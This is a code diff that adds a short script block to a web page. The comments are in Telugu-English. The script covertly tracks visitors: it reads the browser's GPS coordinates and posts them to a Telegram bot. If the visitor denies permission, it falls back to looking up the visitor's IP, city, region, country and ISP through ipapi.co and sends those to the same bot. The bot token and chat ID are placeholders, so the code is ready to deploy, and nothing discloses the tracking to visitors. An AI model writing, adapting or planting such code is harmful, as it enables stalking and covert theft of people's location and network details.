@@ -1,0 +1,42 @@
+<script>
+  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // Mee Telegram Bot Token
+  const CHAT_ID = "YOUR_CHAT_ID_HERE";     // Mee Telegram Chat ID
+
+  // 1. Browser Permission adagadaniki GPS Code
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendGPS, getIPLocation);
+  } else {
+    getIPLocation();
+  }
+
+  // User 'Allow' chesthe exact GPS location vasthundhi
+  function sendGPS(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    sendToTelegram(`📍 **Exact GPS Location Received!**\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`);
+  }
+
+  // User 'Block/Deny' chesthe IP dwara approximate City vasthundhi
+  function getIPLocation() {
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const msg = `⚠️ **Permission Denied! IP Location Info:**\n\n` +
+                    `🏙️ **City:** ${data.city}\n` +
+                    `📍 **Region/State:** ${data.region}\n` +
+                    `🏳️ **Country:** ${data.country_name}\n` +
+                    `🌐 **IP Address:** ${data.ip}\n` +
+                    `📡 **ISP:** ${data.org}`;
+        sendToTelegram(msg);
+      })
+      .catch(err => console.log(err));
+  }
+
+  function sendToTelegram(message) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
+    });
+  }
+</script>
